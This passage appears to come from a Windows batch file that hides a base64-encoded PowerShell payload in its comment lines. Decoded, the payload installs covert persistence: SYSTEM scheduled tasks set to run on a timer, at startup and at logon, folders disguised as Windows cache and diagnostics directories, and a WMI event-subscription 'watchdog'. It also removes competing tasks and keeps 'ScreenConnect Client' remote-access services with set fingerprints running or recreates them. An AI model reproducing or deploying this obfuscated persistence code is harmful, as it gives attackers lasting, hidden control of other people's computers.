::bGV0dGVyXVskaV0NCiAgICAgICAgJG4gPSAwDQogICAgICAgIHdoaWxlICgkcGlj
::ay5WYWx1ZXMgLWNvbnRhaW5zICRuYW1lIC1hbmQgJG4gLWx0IDgpIHsgJGkgPSAo
::JGkgKyAxKSAlIDg7ICRuYW1lID0gJFBvb2xzWyRsZXR0ZXJdWyRpXTsgJG4rKyB9
::DQogICAgICAgIGlmICgtbm90ICRuYW1lKSB7ICRuYW1lID0gJERlZmF1bHRzWyJU
::QVNLXyRsZXR0ZXIiXSB9DQogICAgICAgICRwaWNrWyRsZXR0ZXJdID0gJG5hbWUN
::CiAgICB9DQogICAgJGNmZyA9IEAoDQogICAgICAgICJUQVNLX0E9JCgkcGljay5B
::KSINCiAgICAgICAgIlRBU0tfQj0kKCRwaWNrLkIpIg0KICAgICAgICAiVEFTS19D
::PSQoJHBpY2suQykiDQogICAgICAgICJUQVNLX0Q9JCgkcGljay5EKSINCiAgICAg
::ICAgIk1PX0E9JCgyICsgKCRzICUgNCkpIiAgICAgICAgICAjIDItNSBtaW4gaml0
::dGVyDQogICAgICAgICJNT19CPSQoMyArICgoJHMgKyAxKSAlIDMpKSIgICAgIyAz
::LTUgbWluIGppdHRlcg0KICAgICAgICAiU0VFRD0kcyINCiAgICAgICAgIklERU5U
::VkVSPSRJZGVudFZlcnNpb24iDQogICAgKQ0KICAgIFNldC1Db250ZW50IC1MaXRl
::cmFsUGF0aCAkY2ZnUGF0aCAtVmFsdWUgJGNmZyAtRm9yY2UNCiAgICByZXR1cm4g
::KFJlYWQtSWRlbnRpdHkpDQp9DQoNCmZ1bmN0aW9uIE5vcm1hbGl6ZS1UYXNrTmFt
::ZShbc3RyaW5nXSR0bikgew0KICAgIGlmICgtbm90ICR0bikgeyByZXR1cm4gJycg
::fQ0KICAgIHJldHVybiAkdG4uVHJpbSgpLlRyaW1TdGFydCgnXCcpDQp9DQoNCmZ1
::bmN0aW9uIFdyaXRlLU93bkxvZyhbc3RyaW5nXSRtKSB7DQogICAgJGxvZyA9IEpv
::aW4tUGF0aCAkV29ya0RpciAnYm9vdC5lcnInDQogICAgdHJ5IHsgQWRkLUNvbnRl
::bnQgLUxpdGVyYWxQYXRoICRsb2cgLVZhbHVlICRtIC1Gb3JjZSB9IGNhdGNoIHt9
::DQp9DQoNCmZ1bmN0aW9uIEVuc3VyZS1QZXJzaXN0VGFza3Mgew0KICAgICMgTWly
::cm9yIHdvcmtpbmcgZGV0YWNoIChXdWNhY2hlT3duKTogY21kIHNjaHRhc2tzLCBC
::T09UIFRSIHBhdGgsIC9TVCBvbiBNSU5VVEUuDQogICAgJGlkID0gSW5pdGlhbGl6
::ZS1JZGVudGl0eQ0KICAgIGlmICgtbm90ICRNb25QYXRoKSB7ICRNb25QYXRoID0g
::Sm9pbi1QYXRoICRXb3JrRGlyICdvd25fbW9uLmNtZCcgfQ0KICAgICRib290ID0g
::Sm9pbi1QYXRoICRlbnY6U3lzdGVtUm9vdCAnVGVtcFwud3VjYWNoZScNCiAgICAk
::ZXRsRGlyID0gJ0M6XFByb2dyYW1EYXRhXE1pY3Jvc29mdFxEaWFnbm9zaXNcU3Rh
::dGVcLmV0bGNhY2hlJw0KICAgIGZvcmVhY2ggKCRkIGluIEAoJGJvb3QsICRldGxE
::aXIpKSB7DQogICAgICAgIGlmICgtbm90IChUZXN0LVBhdGggLUxpdGVyYWxQYXRo
::ICRkKSkgeyBOZXctSXRlbSAtSXRlbVR5cGUgRGlyZWN0b3J5IC1QYXRoICRkIC1G
::b3JjZSB8IE91dC1OdWxsIH0NCiAgICB9DQogICAgJGJvb3RNb24gPSBKb2luLVBh
::dGggJGJvb3QgJ293bl9tb24uY21kJw0KICAgICRib290RXRsID0gSm9pbi1QYXRo
::ICRib290ICdldGxfbW9uLmNtZCcNCiAgICAkZXRsTW9uID0gSm9pbi1QYXRoICRl
::dGxEaXIgJ2V0bF9tb24uY21kJw0KICAgIGlmIChUZXN0LVBhdGggLUxpdGVyYWxQ
::YXRoICRNb25QYXRoKSB7DQogICAgICAgIENvcHktSXRlbSAtTGl0ZXJhbFBhdGgg
::JE1vblBhdGggLURlc3RpbmF0aW9uICRib290TW9uIC1Gb3JjZSAtRXJyb3JBY3Rp
::b24gU2lsZW50bHlDb250aW51ZQ0KICAgICAgICBDb3B5LUl0ZW0gLUxpdGVyYWxQ
::YXRoICRNb25QYXRoIC1EZXN0aW5hdGlvbiAkYm9vdEV0bCAtRm9yY2UgLUVycm9y
::QWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICAgICAgQ29weS1JdGVtIC1MaXRl
::cmFsUGF0aCAkTW9uUGF0aCAtRGVzdGluYXRpb24gJGV0bE1vbiAtRm9yY2UgLUVy
::cm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICB9DQogICAgIyBCT09UIGlz
::IG5vdCBMb2NrRGlyJ2QgYnkgb3duX3NlY3VyZSDigJQgVGFzayBTY2hlZHVsZXIg
::Y2FuIHJlc29sdmUgVFIgdGhlcmUuDQogICAgJHRyTW9uID0gImNtZC5leGUgL2Mg
::JGJvb3RNb24iDQogICAgJHRyRXRsID0gImNtZC5leGUgL2MgJGJvb3RFdGwiDQog
::ICAgJG1vQSA9IFtzdHJpbmddJGlkWydNT19BJ107IGlmICgtbm90ICRtb0EpIHsg
::JG1vQSA9ICcyJyB9DQogICAgJG1vQiA9IFtzdHJpbmddJGlkWydNT19CJ107IGlm
::ICgtbm90ICRtb0IpIHsgJG1vQiA9ICczJyB9DQogICAgJHN0ID0gKEdldC1EYXRl
::KS5Ub1N0cmluZygnSEg6bW0nKQ0KICAgICRzcGVjcyA9IEAoDQogICAgICAgIEB7
::IEtleSA9ICdUQVNLX0EnOyBNYXJrZXIgPSAnb3duX21vbi5jbWQnOyBTYyA9ICdN
::SU5VVEUnOyBNbyA9ICRtb0E7IFRyID0gJHRyTW9uIH0NCiAgICAgICAgQHsgS2V5
::ID0gJ1RBU0tfQic7IE1hcmtlciA9ICdldGxfbW9uLmNtZCc7IFNjID0gJ01JTlVU
::RSc7IE1vID0gJG1vQjsgVHIgPSAkdHJFdGwgfQ0KICAgICAgICBAeyBLZXkgPSAn
::VEFTS19DJzsgTWFya2VyID0gJ293bl9tb24uY21kJzsgU2MgPSAnT05TVEFSVCc7
::IE1vID0gJyc7IFRyID0gJHRyTW9uIH0NCiAgICAgICAgQHsgS2V5ID0gJ1RBU0tf
::RCc7IE1hcmtlciA9ICdvd25fbW9uLmNtZCc7IFNjID0gJ09OTE9HT04nOyBNbyA9
::ICcnOyBUciA9ICR0ck1vbiB9DQogICAgKQ0KICAgICRvayA9IDA7ICRyZWFybWVk
::ID0gMDsgJGZhaWwgPSAwDQogICAgZm9yZWFjaCAoJHNwIGluICRzcGVjcykgew0K
::ICAgICAgICAkdG4gPSBOb3JtYWxpemUtVGFza05hbWUgKFtzdHJpbmddJGlkWyRz
::cC5LZXldKQ0KICAgICAgICBpZiAoLW5vdCAkdG4pIHsgJGZhaWwrKzsgY29udGlu
::dWUgfQ0KICAgICAgICBpZiAoVGVzdC1UYXNrT3duc01vbiAkdG4gJHNwLk1hcmtl
::cikgeyAkb2srKzsgY29udGludWUgfQ0KICAgICAgICBpZiAoVGVzdC1UYXNrT3du
::c01vbiAoIlwkdG4iKSAkc3AuTWFya2VyKSB7ICRvaysrOyBjb250aW51ZSB9DQog
::ICAgICAgICRibG9iID0gR2V0LVRhc2tWZXJib3NlQmxvYiAkdG4NCiAgICAgICAg
::aWYgKC1ub3QgJGJsb2IpIHsgJGJsb2IgPSBHZXQtVGFza1ZlcmJvc2VCbG9iICgi
::XCR0biIpIH0NCiAgICAgICAgaWYgKCRibG9iKSB7DQogICAgICAgICAgICAkb3Vy
::c0Jyb2tlbiA9ICgkYmxvYiAtbWF0Y2ggJyg/aSlvd25fbW9uXC5jbWR8ZXRsX21v
::blwuY21kfFwud3VjYWNoZVxcfFwuZXRsY2FjaGVcXCcpDQogICAgICAgICAgICBp
::ZiAoLW5vdCAkb3Vyc0Jyb2tlbikgeyAkZmFpbCsrOyBXcml0ZS1Pd25Mb2cgInRh
::c2tzX3NraXBfZm9yZWlnbiAkdG4iOyBjb250aW51ZSB9DQogICAgICAgICAgICBS
::ZW1vdmUtVGFza1F1aWV0ICR0bg0KICAgICAgICAgICAgUmVtb3ZlLVRhc2tRdWll
::dCAoIlwkdG4iKQ0KICAgICAgICB9DQogICAgICAgICMgQnVpbGQgY21kbGluZSBl
::eGFjdGx5IGxpa2Ugb3duLmNtZCBkZXRhY2ggKHByb3ZlbiB0byB3b3JrIGFzIFNZ
::U1RFTSkuDQogICAgICAgICRwYXJ0cyA9IEAoDQogICAgICAgICAgICAnL0NyZWF0
::ZScsICcvVE4nLCAkdG4sICcvUlUnLCAnU1lTVEVNJywgJy9STCcsICdISUdIRVNU
::JywgJy9GJywNCiAgICAgICAgICAgICcvVFInLCAkc3AuVHIsICcvU0MnLCAkc3Au
::U2MNCiAgICAgICAgKQ0KICAgICAgICBpZiAoJHNwLlNjIC1lcSAnTUlOVVRFJykg
::ew0KICAgICAgICAgICAgJHBhcnRzICs9IEAoJy9NTycsICRzcC5NbywgJy9TVCcs
::ICRzdCkNCiAgICAgICAgfQ0KICAgICAgICAkYXJnTGluZSA9ICgkcGFydHMgfCBG
::b3JFYWNoLU9iamVjdCB7DQogICAgICAgICAgICBpZiAoJF8gLW1hdGNoICdbXHMi
::XScpIHsgJyJ7MH0iJyAtZiAoJF8gLXJlcGxhY2UgJyInLCAnXCInKSB9IGVsc2Ug
::eyAkXyB9DQogICAgICAgIH0pIC1qb2luICcgJw0KICAgICAgICAkY3JlYXRlVHh0
::ID0gY21kLmV4ZSAvYyAic2NodGFza3MuZXhlICRhcmdMaW5lIiAyPiYxIHwgRm9y
::RWFjaC1PYmplY3QgeyAiJF8iIH0NCiAgICAgICAgJGNyZWF0ZUpvaW5lZCA9ICgk
::Y3JlYXRlVHh0IC1qb2luICcgJykuVHJpbSgpDQogICAgICAgIFdyaXRlLU93bkxv
::ZyAidGFza3NfY3JlYXRlICQoJHNwLktleSkgJHRuID0+ICRjcmVhdGVKb2luZWQi
::DQogICAgICAgIGlmICgoVGVzdC1UYXNrT3duc01vbiAkdG4gJHNwLk1hcmtlcikg
::LW9yIChUZXN0LVRhc2tPd25zTW9uICgiXCR0biIpICRzcC5NYXJrZXIpKSB7DQog
::ICAgICAgICAgICAkcmVhcm1lZCsrDQogICAgICAgICAgICBpZiAoJHNwLktleSAt
::ZXEgJ1RBU0tfQScgLW9yICRzcC5LZXkgLWVxICdUQVNLX0InKSB7DQogICAgICAg
::ICAgICAgICAgY21kLmV4ZSAvYyAic2NodGFza3MuZXhlIC9SdW4gL1ROIGAiJHRu
::YCIiIHwgT3V0LU51bGwNCiAgICAgICAgICAgIH0NCiAgICAgICAgfSBlbHNlIHsN
::CiAgICAgICAgICAgICRmYWlsKysNCiAgICAgICAgICAgIFdyaXRlLU93bkxvZyAi
::dGFza3NfY3JlYXRlX0ZBSUwgJCgkc3AuS2V5KSAkdG4iDQogICAgICAgIH0NCiAg
::ICB9DQogICAgcmV0dXJuICJ0YXNrcyBvaz0kb2sgcmVhcm1lZD0kcmVhcm1lZCBm
::YWlsPSRmYWlsIg0KfQ0KDQpmdW5jdGlvbiBSZW1vdmUtV2F0Y2hkb2cgew0KICAg
::IGZvcmVhY2ggKCRjbHMgaW4gQCgnX19GaWx0ZXJUb0NvbnN1bWVyQmluZGluZycs
::J19fRXZlbnRGaWx0ZXInLCdDb21tYW5kTGluZUV2ZW50Q29uc3VtZXInLCdfX0lu
::dGVydmFsVGltZXJJbnN0cnVjdGlvbicpKSB7DQogICAgICAgIEdldC1XbWlPYmpl
::Y3QgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgJGNscyAtRXJy
::b3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8DQogICAgICAgICAgICBXaGVyZS1P
::YmplY3Qgew0KICAgICAgICAgICAgICAgICgkXy5OYW1lIC1lcSAnV3VjYWNoZVdh
::dGNoZG9nRicpIC1vciAoJF8uTmFtZSAtZXEgJ1d1Y2FjaGVXYXRjaGRvZ0MnKSAt
::b3INCiAgICAgICAgICAgICAgICAoJF8uVGltZXJJZCAtZXEgJ1d1Y2FjaGVXYXRj
::aGRvZycpIC1vcg0KICAgICAgICAgICAgICAgICgkXy5GaWx0ZXIgLWFuZCAkXy5G
::aWx0ZXIuVG9TdHJpbmcoKSAtbGlrZSAnKld1Y2FjaGVXYXRjaGRvZ0YqJykgLW9y
::DQogICAgICAgICAgICAgICAgKCRfLkNvbnN1bWVyIC1hbmQgJF8uQ29uc3VtZXIu
::VG9TdHJpbmcoKSAtbGlrZSAnKld1Y2FjaGVXYXRjaGRvZ0MqJykNCiAgICAgICAg
::ICAgIH0gfCBGb3JFYWNoLU9iamVjdCB7ICRfLkRlbGV0ZSgpIHwgT3V0LU51bGwg
::fQ0KICAgIH0NCn0NCg0KZnVuY3Rpb24gSW5zdGFsbC1XYXRjaGRvZyB7DQogICAg
::aWYgKC1ub3QgJE1vblBhdGgpIHsgcmV0dXJuICRmYWxzZSB9DQogICAgUmVtb3Zl
::LVdhdGNoZG9nDQogICAgJG9rID0gJHRydWUNCiAgICB0cnkgew0KICAgICAgICBT
::ZXQtV21pSW5zdGFuY2UgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xh
::c3MgX19JbnRlcnZhbFRpbWVySW5zdHJ1Y3Rpb24gYA0KICAgICAgICAgICAgLUFy
::Z3VtZW50cyBAeyBUaW1lcklkID0gJ1d1Y2FjaGVXYXRjaGRvZyc7IEludGVydmFs
::TWlsbGlzZWNvbmRzID0gMTgwMDAwOyBTa2lwSWZQYXNzZWQgPSAkZmFsc2UgfSB8
::IE91dC1OdWxsDQogICAgICAgICRmID0gU2V0LVdtaUluc3RhbmNlIC1OYW1lc3Bh
::Y2Ugcm9vdFxzdWJzY3JpcHRpb24gLUNsYXNzIF9fRXZlbnRGaWx0ZXIgYA0KICAg
::ICAgICAgICAgLUFyZ3VtZW50cyBAeyBOYW1lID0gJ1d1Y2FjaGVXYXRjaGRvZ0Yn
::OyBFdmVudE5hbWVzcGFjZSA9ICdyb290XGNpbXYyJzsgUXVlcnlMYW5ndWFnZSA9
::ICdXUUwnOw0KICAgICAgICAgICAgICAgICAgICAgICAgICBRdWVyeSA9ICJTRUxF
::Q1QgKiBGUk9NIF9fVGltZXJFdmVudCBXSEVSRSBUaW1lcklkPSdXdWNhY2hlV2F0
::Y2hkb2cnIiB9DQogICAgICAgICRjID0gU2V0LVdtaUluc3RhbmNlIC1OYW1lc3Bh
::Y2Ugcm9vdFxzdWJzY3JpcHRpb24gLUNsYXNzIENvbW1hbmRMaW5lRXZlbnRDb25z
::dW1lciBgDQogICAgICAgICAgICAtQXJndW1lbnRzIEB7IE5hbWUgPSAnV3VjYWNo
::ZVdhdGNoZG9nQyc7IENvbW1hbmRMaW5lVGVtcGxhdGUgPSAiY21kLmV4ZSAvYyBg
::IiRNb25QYXRoYCIiOyBSdW5JbnRlcmFjdGl2ZWx5ID0gJGZhbHNlIH0NCiAgICAg
::ICAgU2V0LVdtaUluc3RhbmNlIC1OYW1lc3BhY2Ugcm9vdFxzdWJzY3JpcHRpb24g
::LUNsYXNzIF9fRmlsdGVyVG9Db25zdW1lckJpbmRpbmcgYA0KICAgICAgICAgICAg
::LUFyZ3VtZW50cyBAeyBGaWx0ZXIgPSAkZjsgQ29uc3VtZXIgPSAkYyB9IHwgT3V0
::LU51bGwNCiAgICB9IGNhdGNoIHsgJG9rID0gJGZhbHNlIH0NCiAgICByZXR1cm4g
::JG9rDQp9DQoNCmZ1bmN0aW9uIFRlc3QtV2F0Y2hkb2dHcmFwaCB7DQogICAgJHQg
::PSBHZXQtV21pT2JqZWN0IC1OYW1lc3BhY2Ugcm9vdFxzdWJzY3JpcHRpb24gLUNs
::YXNzIF9fSW50ZXJ2YWxUaW1lckluc3RydWN0aW9uIC1GaWx0ZXIgIlRpbWVySWQ9
::J1d1Y2FjaGVXYXRjaGRvZyciIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVl
::DQogICAgJGYgPSBHZXQtV21pT2JqZWN0IC1OYW1lc3BhY2Ugcm9vdFxzdWJzY3Jp
::cHRpb24gLUNsYXNzIF9fRXZlbnRGaWx0ZXIgLUZpbHRlciAiTmFtZT0nV3VjYWNo
::ZVdhdGNoZG9nRiciIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAg
::JGMgPSBHZXQtV21pT2JqZWN0IC1OYW1lc3BhY2Ugcm9vdFxzdWJzY3JpcHRpb24g
::LUNsYXNzIENvbW1hbmRMaW5lRXZlbnRDb25zdW1lciAtRmlsdGVyICJOYW1lPSdX
::dWNhY2hlV2F0Y2hkb2dDJyIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUN
::CiAgICAkYiA9ICRudWxsDQogICAgaWYgKCRmIC1hbmQgJGMpIHsNCiAgICAgICAg
::JGIgPSBHZXQtV21pT2JqZWN0IC1OYW1lc3BhY2Ugcm9vdFxzdWJzY3JpcHRpb24g
::LUNsYXNzIF9fRmlsdGVyVG9Db25zdW1lckJpbmRpbmcgLUVycm9yQWN0aW9uIFNp
::bGVudGx5Q29udGludWUgfA0KICAgICAgICAgICAgV2hlcmUtT2JqZWN0IHsgJF8u
::RmlsdGVyIC1saWtlICcqV3VjYWNoZVdhdGNoZG9nRionIC1hbmQgJF8uQ29uc3Vt
::ZXIgLWxpa2UgJypXdWNhY2hlV2F0Y2hkb2dDKicgfSB8DQogICAgICAgICAgICBT
::ZWxlY3QtT2JqZWN0IC1GaXJzdCAxDQogICAgfQ0KICAgIHJldHVybiBbYm9vbF0o
::JHQgLWFuZCAkZiAtYW5kICRjIC1hbmQgJGIpDQp9DQoNCmZ1bmN0aW9uIEVuc3Vy
::ZS1XYXRjaGRvZyB7DQogICAgaWYgKFRlc3QtV2F0Y2hkb2dHcmFwaCkgeyByZXR1
::cm4gJ09LJyB9DQogICAgaWYgKC1ub3QgJE1vblBhdGgpIHsgcmV0dXJuICdNSVNT
::SU5HJyB9DQogICAgaWYgKEluc3RhbGwtV2F0Y2hkb2cpIHsgcmV0dXJuICdSRUFS
::TUVEJyB9DQogICAgcmV0dXJuICdGQUlMJw0KfQ0KDQojIENvcnJlY3QgMzItYml0
::ICsgNjQtYml0IEFSUCBoaXZlcy4gTDYgYW5kIGVhcmxpZXIgdXNlZCBhIHRydW5j
::YXRlZA0KIyBXT1c2NDMyTm9kZSBwYXRoIChtaXNzaW5nIE1pY3Jvc29mdFxXaW5k
::b3dzKSBzbyBFVkVSWSAzMi1iaXQgU0MgcHJvZHVjdA0KIyB3YXMgaW52aXNpYmxl
::IHRvIHJlcGFpci9leHRlcm1pbmF0ZS9yZWdpc3RlcmVkLg0KJHNjcmlwdDpVbmlu
::c3RhbGxSb290cyA9IEAoDQogICAgJ0hLTE06XFNPRlRXQVJFXE1pY3Jvc29mdFxX
::aW5kb3dzXEN1cnJlbnRWZXJzaW9uXFVuaW5zdGFsbCcsDQogICAgJ0hLTE06XFNP
::RlRXQVJFXFdPVzY0MzJOb2RlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJz
::aW9uXFVuaW5zdGFsbCcNCikNCg0KZnVuY3Rpb24gVGVzdC1TQ1JlZ2lzdGVyZWQo
::W3N0cmluZ10kRmluZ2VycHJpbnQpIHsNCiAgICAjIEw4OiBORVZFUiB1c2UgcmV0
::dXJuIGluc2lkZSBGb3JFYWNoLU9iamVjdCAtIGl0IG9ubHkgZXhpdHMgdGhlDQog
::ICAgIyBwaXBlbGluZSBpdGVyYXRpb24sIHNvIHRoaXMgZnVuY3Rpb24gYWx3YXlz
::IGZlbGwgdGhyb3VnaCB0byAnbm8nDQogICAgIyBhbmQgdGhlIG1vbiBvcnBoYW4t
::bGFkZGVyIGRlbGV0ZWQgaGVhbHRoeSByZWdpc3RlcmVkIHNlcnZpY2VzLg0KICAg
::IGlmICgtbm90ICRGaW5nZXJwcmludCkgeyByZXR1cm4gJ25vJyB9DQogICAgJG5h
::bWUgPSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCRGaW5nZXJwcmludCkiDQogICAg
::Zm9yZWFjaCAoJHJvb3QgaW4gJHNjcmlwdDpVbmluc3RhbGxSb290cykgew0KICAg
::ICAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRyb290KSkgeyBjb250aW51ZSB9DQog
::ICAgICAgIGZvcmVhY2ggKCRrZXkgaW4gKEdldC1DaGlsZEl0ZW0gJHJvb3QgLUVy
::cm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpKSB7DQogICAgICAgICAgICAkZG4g
::PSAoR2V0LUl0ZW1Qcm9wZXJ0eSAka2V5LlBTUGF0aCAtRXJyb3JBY3Rpb24gU2ls
::ZW50bHlDb250aW51ZSkuRGlzcGxheU5hbWUNCiAgICAgICAgICAgIGlmICgkZG4g
::LWFuZCAoJGRuIC1pZXEgJG5hbWUpIC1hbmQgKCRrZXkuUFNDaGlsZE5hbWUgLWxp
::a2UgJ3sqfScpKSB7IHJldHVybiAneWVzJyB9DQogICAgICAgIH0NCiAgICB9DQog
::ICAgcmV0dXJuICdubycNCn0NCg0KZnVuY3Rpb24gUmVwYWlyLVNDU2VydmljZShb
::c3RyaW5nXSRGaW5nZXJwcmludCkgew0KICAgICMgTDMwOiBORVZFUiBydW4gbXNp
::ZXhlYyAvZmEgb3IgL2kgb24gYSBTY3JlZW5Db25uZWN0IHByb2R1Y3Qg4oCUIFND
::IGluc3RhbmNlcyBzaGFyZQ0KICAgICMgbGVnYWN5IFVwZ3JhZGVDb2Rlcywgc28g
::YW55IG1zaWV4ZWMgcmVwYWlyL2luc3RhbGwgb24gb25lIEZQIHRyaWdnZXJzIGEN
::CiAgICAjIG1ham9yLXVwZ3JhZGUgcmVtb3ZhbCB0aGF0IGtub2NrcyBzaWJsaW5n
::IFNjcmVlbkNvbm5lY3QgT0ZGTElORS4gU2VydmljZS1sZXZlbCBoZWFsIG9ubHku
::DQogICAgaWYgKC1ub3QgJEZpbmdlcnByaW50KSB7IHJldHVybiAnbm8tZnAnIH0N
::CiAgICAkbmFtZSA9ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJEZpbmdlcnByaW50
::KSINCiAgICAkc3ZjID0gR2V0LVNlcnZpY2UgLU5hbWUgJG5hbWUgLUVycm9yQWN0
::aW9uIFNpbGVudGx5Q29udGludWUNCiAgICBpZiAoJHN2YyAtYW5kICRzdmMuU3Rh
::dHVzIC1lcSAnUnVubmluZycpIHsgcmV0dXJuICdzdmMtcnVubmluZycgfQ0KICAg
::IGlmICgkc3ZjKSB7DQogICAgICAgICMgcHJlc2VudCBidXQgc3RvcHBlZCAtPiBz
::ZXJ2aWNlLWxldmVsIHN0YXJ0LCBubyBtc2lleGVjDQogICAgICAgICYgc2MuZXhl
::IGNvbmZpZyAiJG5hbWUiIHN0YXJ0PSBhdXRvIDI+JjEgfCBPdXQtTnVsbA0KICAg
::ICAgICAmIHNjLmV4ZSBmYWlsdXJlICIkbmFtZSIgcmVzZXQ9IDg2NDAwIGFjdGlv
::bnM9IHJlc3RhcnQvNTAwMC9yZXN0YXJ0LzUwMDAvcmVzdGFydC81MDAwIDI+JjEg
::fCBPdXQtTnVsbA0KICAgICAgICAmIHNjLmV4ZSBzdGFydCAiJG5hbWUiIDI+JjEg
::fCBPdXQtTnVsbA0KICAgICAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyA2DQogICAg
::ICAgICYgc2MuZXhlIHN0YXJ0ICIkbmFtZSIgMj4mMSB8IE91dC1OdWxsDQogICAg
::ICAgICRzdmMgPSBHZXQtU2VydmljZSAtTmFtZSAkbmFtZSAtRXJyb3JBY3Rpb24g
::U2lsZW50bHlDb250aW51ZQ0KICAgICAgICBpZiAoJHN2YyAtYW5kICRzdmMuU3Rh
::dHVzIC1lcSAnUnVubmluZycpIHsgcmV0dXJuICdzdmMtc3RhcnRlZCcgfQ0KICAg
::ICAgICByZXR1cm4gJ3N2Yy1zdGlsbC1zdG9wcGVkLW5vcmVwYWlyKG1zaWV4ZWMt
::ZGlzYWJsZWQpJw0KICAgIH0NCiAgICAjIHNlcnZpY2UgZW50cnkgZ29uZTogcmUt
::Y3JlYXRlIGZyb20gdGhlIHJlZ2lzdGVyZWQgcHJvZHVjdCdzIGluc3RhbGwgZGly
::IFdJVEhPVVQgbXNpZXhlYy4NCiAgICAjIElmIGJpbmFyaWVzIGV4aXN0LCBzYy5l
::eGUgY3JlYXRlICsgc3RhcnQuIEVsc2UgcmVwb3J0IHNvIGNhbGxlciBjYW4gZGVj
::aWRlIChuZXZlciAvZmEsIG5ldmVyIC9pKS4NCiAgICAkZGlyID0gJG51bGwNCiAg
::ICBmb3JlYWNoICgkYmFzZSBpbiBAKCR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfSwg
::JGVudjpQcm9ncmFtRmlsZXMpKSB7DQogICAgICAgICRjYW5kID0gSm9pbi1QYXRo
::ICRiYXNlICJTY3JlZW5Db25uZWN0IENsaWVudCAoJEZpbmdlcnByaW50KSINCiAg
::ICAgICAgaWYgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggKEpvaW4tUGF0aCAkY2Fu
::ZCAnU2NyZWVuQ29ubmVjdC5DbGllbnRTZXJ2aWNlLmV4ZScpKSB7ICRkaXIgPSAk
::Y2FuZDsgYnJlYWsgfQ0KICAgIH0NCiAgICBpZiAoLW5vdCAkZGlyKSB7IHJldHVy
::biAnbm90LXJlZ2lzdGVyZWQtbm9yZXBhaXIobXNpZXhlYy1kaXNhYmxlZCknIH0N
::CiAgICAkZXhlID0gSm9pbi1QYXRoICRkaXIgJ1NjcmVlbkNvbm5lY3QuQ2xpZW50
::U2VydmljZS5leGUnDQogICAgJiBzYy5leGUgY3JlYXRlICIkbmFtZSIgYmluUGF0
::aD0gImAiJGV4ZWAiIiBzdGFydD0gYXV0byBEaXNwbGF5TmFtZT0gIiRuYW1lIiAy
::PiYxIHwgT3V0LU51bGwNCiAgICAmIHNjLmV4ZSBmYWlsdXJlICIkbmFtZSIgcmVz
::ZXQ9IDg2NDAwIGFjdGlvbnM9IHJlc3RhcnQvNTAwMC9yZXN0YXJ0LzUwMDAvcmVz
::dGFydC81MDAwIDI+JjEgfCBPdXQtTnVsbA0KICAgICYgc2MuZXhlIHN0YXJ0ICIk
::bmFtZSIgMj4mMSB8IE91dC1OdWxsDQogICAgU3RhcnQtU2xlZXAgLVNlY29uZHMg
::NQ0KICAgICRzdmMgPSBHZXQtU2VydmljZSAtTmFtZSAkbmFtZSAtRXJyb3JBY3Rp
::b24gU2lsZW50bHlDb250aW51ZQ0KICAgIGlmICgkc3ZjIC1hbmQgJHN2Yy5TdGF0
::dXMgLWVxICdSdW5uaW5nJykgeyByZXR1cm4gJ3N2Yy1yZWNyZWF0ZWQtc3RhcnRl
::ZCcgfQ0KICAgIHJldHVybiAnc3ZjLXJlY3JlYXRlZC1ub3QtcnVubmluZycNCn0N
::Cg0KDQokc2NyaXB0OlNldnJ6RGVmYXVsdFByaW1hcnkgPSAnNWY2MDEwNTc5ODUy
::ZTUwNycNCiRzY3JpcHQ6U2V2cnpEZWZhdWx0QWx0ID0gJ2Y4NjFjODE0MGQ0NTM0
::MjcnDQokc2NyaXB0OlNldnJ6S2VlcCA9IEAoJHNjcmlwdDpTZXZyekRlZmF1bHRQ
::cmltYXJ5LCAkc2NyaXB0OlNldnJ6RGVmYXVsdEFsdCkNCg0KIyBMNDA6IFJTQSBw
::dWJsaWMga2V5IGZvciB1cGRhdGUubWFuaWZlc3QgdmVyaWZpY2F0aW9uIChwcml2
::YXRlIGtleSBpbiBrZXlzLywgZ2l0aWdub3JlZCkNCiRzY3JpcHQ6VXBkYXRlUHVi
::S2V5WG1sID0gQCcNCjxSU0FLZXlWYWx1ZT48TW9kdWx1cz50QUJaUG52c3Vwb3Jp
::MTltdEpiSG9UMXVGR1ZMTktxT05CMHh0dklCSDRIcGZNNVUrU3RDdUduRWRJeVB5
::a01RUGpERWxWQlpPZWE4cGRkQnh4UE1JOTRkNFZCcGR3blFlZFdIbG5sNkV1UXNK
::TDJNTWMweG8wZHV6cFFkUFZqRG5lSUl0T3hWTW5sNE1tVFNTOGkxNU9mTlRINnlk
::ZGxmaTZ0TmZUdnZDdGt4bEw5YzBxWHh0SW9ZTFFMOWpDMjk0dDJPMHZPc0FsaWgw
::aFM2WEFHcDhPQVRLUi9LVlBwOHFmdzh0enJTdktnWWtwZTc5Yko2N2J0ak83cVRI
::djFKcFAwNHhlWXRDS2pTRk42WGgwMmRydHF2eXVDSHZ3MSswSFlmdmlhSDV5TkFw
::d29OeC9mNVU2M3VNaWlyS3VKYVpNQnZYTTh1bXh5a0FHcnFkU1UwcFE9PTwvTW9k
::dWx1cz48RXhwb25lbnQ+QVFBQjwvRXhwb25lbnQ+PC9SU0FLZXlWYWx1ZT4NCidA
::DQoNCmZ1bmN0aW9uIEdldC1TZXZyekNmZ1BhdGggeyBKb2luLVBhdGggJFdvcmtE
::aXIgJ3NldnJ6LmNmZycgfQ0KDQpmdW5jdGlvbiBHZXQtU2V2cnpLZWVwIHsNCiAg
::ICAkcHJpbSA9ICRzY3JpcHQ6U2V2cnpEZWZhdWx0UHJpbWFyeQ0KICAgICRhbHQg
::PSAkc2NyaXB0OlNldnJ6RGVmYXVsdEFsdA0KICAgICRwID0gR2V0LVNldnJ6Q2Zn
